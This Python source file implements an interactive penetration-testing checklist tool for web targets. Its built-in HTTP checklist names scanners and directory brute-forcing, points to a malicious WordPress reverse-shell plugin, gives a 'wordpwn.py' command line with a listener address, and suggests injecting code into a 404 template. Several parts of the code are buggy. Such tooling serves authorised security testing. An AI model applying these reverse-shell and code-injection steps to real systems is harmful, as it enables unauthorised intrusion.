
import json
import Session
import logging

from MenuBase import MenuBase

class ChecklistItem:
    def __init__(self, entry, steps = [], codeblock = '', result = 'NO', notes = ''):
        self._entry = entry
        self._steps = steps
        self._codeblock = codeblock
        self._result = result
        self._notes = notes
        return

    def __str__(self):
        return 'Entry: ' + str(self._entry) + '\r\n' + \
            'Steps: \r\n' + [print('\t' + s) for s in self._steps] + '\r\n' + \
            ('Code Block: \r\n' + self._codeblock) if len(self._codeblock) > 0 else '' + \
            'Result: ' + self._result + '\r\n' + \
            'Notes: ' + str(self._notes) + '\r\n\r\n'

class ChecklistManager:
    def __init__(self):
        self._checklistCategories = { }

        self._checklistCategories.update( { 1: HttpChecklist() } )

        try:
            jsonFile = './checklists.json'
            data = None
            with open(jsonFile, encoding="utf8") as f:
                data = json.load(f)

            count = len(self._checklistCategories) + 1
            for obj in data:
                name = obj['name']
                checklist = ChecklistCategoryBase(name)

                for item in obj['items']:
                    steps = [ ]
                    for step in item['steps']:
                        steps.append(step)

                    item = ChecklistItem(item['entry'], steps, item['codeBlock'])
                    checklist.addItem(item)

                self._checklistCategories.update({ count : checklist })
                count += 1

        except Exception as e:
            logging.exception(type(e))

        return

    def __str__(self):
        return ''

    def getChecklists(self):
        return self._checklistCategories

    def setValue(self, categoryName, id, result, notes):
        for i, category in self._checklistCategories.items():
            if category._CategoryName == categoryName:
                category.loadResult(id, result, notes)
                return

    def run(self, categoryName):
        for i, category in self._checklistCategories.items():
            if category._CategoryName == categoryName:
                category.run()
                return
        
        print('Unable to find category')
        return

    def showAllChecklist(self, categoryName):
        for i, category in self._checklistCategories.items():
            if category._CategoryName.lower() == categoryName.lower():
                print('## ' + MenuBase.TITLE + category._CategoryName + MenuBase.ENDC)

                for i, item in category._items.items():
                    if item._result == 'DONE':
                        print('- [x] ' + item._entry)
                    else:
                        print('- [ ] ' + item._entry)

                    if len(item._notes) > 0:
                        print('Notes: ' + item._notes)
            break

        return

    def showAllChecklistByIndex(self, index):
        category = self._checklistCategories[index]
        print('## ' + MenuBase.TITLE + category._CategoryName + MenuBase.ENDC)

        for i, item in category._items.items():
            if item._result == 'DONE':
                print('- [x] ' + item._entry)
            else:
                print('- [ ] ' + item._entry)

            if len(item._notes) > 0:
                print('Notes: ' + item._notes)

        return

    def generateReport(self):
        with open(Session.session.getReportDir() + '/checklists.md','w') as f:
            print('# Checklists', file = f)

            for i, category in self._checklistCategories.items():
                print('## ' + category._CategoryName, file = f)

                for i, item in category._items.items():
                    if item._result == 'DONE':
                        print('- [x] ' + item._entry, file = f)
                    else:
                        print('- [ ] ' + item._entry, file = f)

                    if len(item._notes) > 0:
                        print('Notes: ' + item._notes, file = f)

                print('', file = f)

        return

class ChecklistCategoryBase:
    def __init__(self, name):
        self._CategoryName = name
        self._items = { }
        self._stopped = False
        return

    def run(self):
        for i, item in self._items.items():
            while True:
                # False is we continue to loop, True is we break, and move on to the next 'item'
                if self.checkItem(i, item) == False:
                    continue;
                elif self._stopped == True:
                    self._stopped = False
                    return
                else:
                    break
        return

    def checkItem(self, i, item):
        import Session

        self._stopped = False

        if item._result == 'DONE' or item._result == 'N/A' or item._result == 'YES':
            print(str(i) + '. ' + MenuBase.TITLE + item._result + MenuBase.ENDC + ' (' + item._entry + ')')
            if len(item._notes) > 0:
                print(MenuBase.MSG + 'NOTES: ' + MenuBase.ENDC + item._notes)
            return True
        else:
            print(str(i) + '. ' + MenuBase.TITLE + item._entry + MenuBase.ENDC)     # Print title
            for s in item._steps:                                                   # Print steps
                if len(s) > 0:
                    print(self.formatStep(s))

            if len(item._codeblock) > 0:                                            # Print code blocks
                print(MenuBase.CODE + item._codeblock + MenuBase.ENDC)
            if len(item._notes) > 0:
                print(MenuBase.MSG + 'NOTES: ' + MenuBase.ENDC + item._notes)

            print('(y/n/na/stop/cmd [CMD]/note [NOTES])')
            result = input()

            if result == 'y' or result == 'Y' or result == 'yes':
                self._items[i]._result = 'DONE'
                print(self._items[i]._result)
                return True
            elif result == 'n' or result == 'N' or result == 'no':
                item._result = 'NO'
                return True
            elif result == 'na' or result == 'NA':
                item._result = 'N/A'
                return True
            elif result == 'stop':
                self._stopped = True
                return
            elif result.startswith('cmd '):
                cmd = result[4:]
                Session.session.runCmdSimple(cmd)
                return False
            elif result.startswith('note '):
                notes = result[5:]
                if len(item._notes) > 0:
                    item._notes += '\r\n' + notes
                else:
                    item._notes = notes
                return False
            else:
                print('Invalid input, type \'stop\' to end the checklist.')
                return False

    def formatStep(self, step):
        # Look for standard arguments
        step = step.replace('${target}', Session.session.getRemoteHost())
        step = step.replace('${working_dir}', Session.session.getWorkingDir())
        step = step.replace('${pass_file}', Session.session.getWordlist())
        step = step.replace('${user_file}', Session.session.getUserlist())

        step = '  * ' + MenuBase.STEPS + step + MenuBase.ENDC

        return step

    def loadResult(self, id, result, notes):
        for i, item in self._items.items():
            if str(i) == str(id):
                item._notes = notes
                item._result = result
                return

    def addItem(self, checklistItem):
        count = len(self._items) + 1
        self._items.update({ count : checklistItem })
        return

class HttpChecklist(ChecklistCategoryBase):
    def __init__(self):
        super().__init__('Http')

        #Standard start
        self._items.update({ 1 : ChecklistItem('Run: OpenVAS, Nessus, Nikto and Nexpose') })
        self._items.update({ 2 : ChecklistItem('Run DirBuster, and DIRB to try and get a directory listing') })
        self._items.update({ 3 : ChecklistItem('Identify any CRMs or other web apps running') })
        self._items.update({ 4 : ChecklistItem('Check for virtual domain requirements.  Does the site have links to it\'s own domain?') })
        self._items.update({ 5 : ChecklistItem('Add the domain to the /ect/hosts file') })
        self._items.update({ 6 : ChecklistItem('Check for any pages that allow input, or URLs, and test for bruteforce.') })

        # Wordpress see if we can inject our own code like in the 404 template
        self._items.update({ 7 : ChecklistItem('Does this have WP? (y/N)') })
        self._items.update({ 8 : ChecklistItem('Do you have access to the control panel?') })
        self._items.update({ 9 : ChecklistItem('You can use a WP reverse shell if you like (msfvenom required): https://github.com/wetw0rk/malicious-wordpress-plugin') })
        self._items.update({ 10 : ChecklistItem('wordpwn.py [LHOST] [LPORT] [HANDLER]  (HANDLER is Y or N) \r\nwordpwn.py 192.168.0.6 8888 Y\r\nThis will generate a plugin to install, and will listen on your machine for a connection') })
        self._items.update({ 11 : ChecklistItem('Also remember to download any server side code when possible, that way you can look for issues/bugs, or hardcoded passwords') })
        self._items.update({ 12 : ChecklistItem('See if we can inject our own code like in the 404 template') })

        # Flash
        self._items.update({ 13 : ChecklistItem('Does this have Flash/Flex? (y/N)') })
        self._items.update({ 14 : ChecklistItem('Utilize \'deblazy.py\' for common checks') })

        # More standard checks
        self._items.update({ 15 : ChecklistItem('Check for robots.txt') })

        return

    def runWordpress(self):
        print(self._items[7]._entry, end = '')
        choice = input()

        if choice.lower() == 'y':
            print('')
            self._items[7]._result = 'YES'

            print(self._items[8]._entry, end = '')       # Do you have access to the control panel?
            choice = input()
            if choice.lower() == 'y':
                print('')
                self._items[8]._result = 'YES'

                count = 9
                while count < 11:
                    if super().checkItem(count, self._items[count]) == False:
                        continue
                    else:
                        count += 1
                        if self._stopped == True:
                            return
            else:
                self._items[8]._result = 'NO'
                self._items[9]._result = 'NO'
                self._items[10]._result = 'NO'
                self._items[11]._result = 'NO'

            print(self._items[12]._entry, end = '')      # Does this have Flash/Flex? (y/N)
            choice = input()
            if choice.lower() == 'y':
                self._items[12]._result = 'YES'
                count = 12
                while count < 12:
                    if super().checkItem(count, self._items[count]) == False:
                        continue
                    else:
                        count += 1
                        if self._stopped == True:
                            return
            else:
                pass
        else:
            pass
        return

    def run(self):
        i = 1
        while i < (len(self._items) + 1):
            if i == 7:                                          # Wordpress stuff
                self.runWordpress()
                i = 14
                continue

            while True:
                if super().checkItem(i, self._items[i]) == False:
                    continue;
                else:
                    if i == 4 and self._stopped == False:    # Setup host file
                        if self._items[i]._result == 'DONE':
                            print('Add the domain to the /ect/hosts file.')
                            print('Example:')
                            print('192.168.1.45 mydomain')
                            print('192.168.1.45 mydomain.com')
                    elif self._stopped == True:
                        return

                    i += 1
                    break
        return